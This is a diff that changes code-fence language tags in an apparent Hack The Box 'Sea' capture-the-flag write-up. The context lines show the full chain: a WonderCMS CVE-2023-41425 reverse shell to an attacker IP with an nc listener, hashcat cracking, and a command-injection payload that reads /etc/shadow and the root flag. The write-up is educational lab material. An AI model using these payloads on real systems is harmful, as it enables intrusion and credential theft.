@@ -7,7 +7,7 @@ date: "2024-08-08"
 ![](attachment/c4cc9c4aee6aa0e906e23da81acfe73a.jpg)
 **Nmap**
 
-```
+```shell
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-12 07:55 EDT
 Nmap scan report for 10.129.27.223
 Host is up (0.050s latency).
@@ -34,7 +34,7 @@ Nmap done: 1 IP address (1 host up) scanned in 27.68 seconds
 
 ![](attachment/bf6ff779445168f6914732ee9f3785f9.png)
 
-```
+```shell
  ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://sea.htb/FUZZ  -mc 200,301,302
 
         /'___\  /'___\           /'___\       
@@ -71,7 +71,7 @@ All endpoints are forbidden
 ![](attachment/b101fa38d06f5fbb4be25ccc65f7175b.png)
 
 
-```
+```shell
 wget http://sea.htb/themes/bike/README.md                                       
 --2024-08-13 05:23:28--  http://sea.htb/themes/bike/README.md
 Resolving sea.htb (sea.htb)... 10.129.111.77
@@ -95,12 +95,12 @@ Looking online found: [CVE-2023-41425 (WonderCMS Remote Code Execution) - PoC](h
 
 	Clone the repo and try. After talking with others on discord
 
-```
+```shell
 http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.126&lport=4444
 ```
 ![](attachment/ef1268efe149e6fffec7386597207bb3.png)
 
-```
+```shell
 $ cd /var/www/sea
 $ cd sea
 $ ls
@@ -140,7 +140,7 @@ $ cat database.js
 
 Fix the hash provided removing the escapes obtaining this:
 
-```
+```shell
 $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
 ┌──(kali㉿kali)-[~/HTB/Sea]
 └─$ hashcat hash.txt -m 3200 /usr/share/wordlists/rockyou.txt
@@ -174,7 +174,7 @@ Stopped: Wed Aug 14 06:22:41 2024
 
 Try this password in ssh with one of these two users:
 
-```
+```shell
 ┌──(kali㉿kali)-[~/HTB/Sea]
 └─$ nc -lnvp 4444
 listening on [any] 4444 ...
@@ -194,7 +194,7 @@ geo
 ![](attachment/5e7f51c554cca528be1ef76f440f477d.png)
 Manipulate burp request on http://localhost:8888 after forwarding this port trough ssh from 8080 of the victim 
 
-```
+```shell
 log_file=/etc/shadow;ls&analyze_log=/etc/shadow
 
 root:$6$llVzHhr7xHrvx1wJ$gH0PLbyPaIOqLrpjpzGZbM2bZ/iHaOfv/bj1YRrktVeZ8.1KQ0Jr1Rv/TL/3Qdh84Fwec1UhX2v0LVAGsuzq.0:19775:0:99999:7::: daemon:*:19430:0:99999:7::: bin:*:19430:0:99999:7::: sys:*:19430:0:99999:7::: sync:*:19430:0:99999:7::: games:*:19430:0:99999:7::: man:*:19430:0:99999:7::: lp:*:19430:0:99999:7::: mail:*:19430:0:99999:7::: news:*:19430:0:99999:7::: uucp:*:19430:0:99999:7::: proxy:*:19430:0:99999:7::: www-data:*:19430:0:99999:7::: backup:*:19430:0:99999:7::: list:*:19430:0:99999:7::: irc:*:19430:0:99999:7::: gnats:*:19430:0:99999:7::: nobody:*:19430:0:99999:7::: systemd-network:*:19430:0:99999:7::: systemd-resolve:*:19430:0:99999:7::: systemd-timesync:*:19430:0:99999:7::: messagebus:*:19430:0:99999:7::: syslog:*:19430:0:99999:7::: _apt:*:19430:0:99999:7::: tss:*:19430:0:99999:7::: uuidd:*:19430:0:99999:7::: tcpdump:*:19430:0:99999:7::: landscape:*:19430:0:99999:7::: pollinate:*:19430:0:99999:7::: fwupd-refresh:*:19430:0:99999:7::: usbmux:*:19774:0:99999:7::: sshd:*:19774:0:99999:7::: systemd-coredump:!!:19774:::::: amay:$6$S1AGe5ex2k4D5MKa$gTclSeJwvND3FINpZaK0zfUqk6T9IkhlxCn17fNWLx56u.zP/f/4e5YrJRPsM3TRuuKXQDfYL44RyPzduexsm.:19775:0:99999:7::: lxd:!:19774:::::: geo:$6$5mAIqOze4GJ4s9Zu$P3IgUSHlcCkKpDJ0862IgP5aqaNilEUZDGIm16FiWdxh1A5dfKjmwhMgp3xctHiHZVWGtmKY25cCrILanDPaG.:19934:0:99999:7::: _laurel:!:19936:::::: 
@@ -203,12 +203,12 @@ root:$6$llVzHhr7xHrvx1wJ$gH0PLbyPaIOqLrpjpzGZbM2bZ/iHaOfv/bj1YRrktVeZ8.1KQ0Jr1Rv
 
 We can get the root flag directly
 
-```
+```shell
 log_file=/root/root.txt;ls&analyze_log=/root/root.txt
 ```
 
 **Flags
-```
+```shell
 user:459138e5dbf2ead0be8b9c7944a38af7
 root:c58fac10593819ba13ab985ab6389ce0
 ```
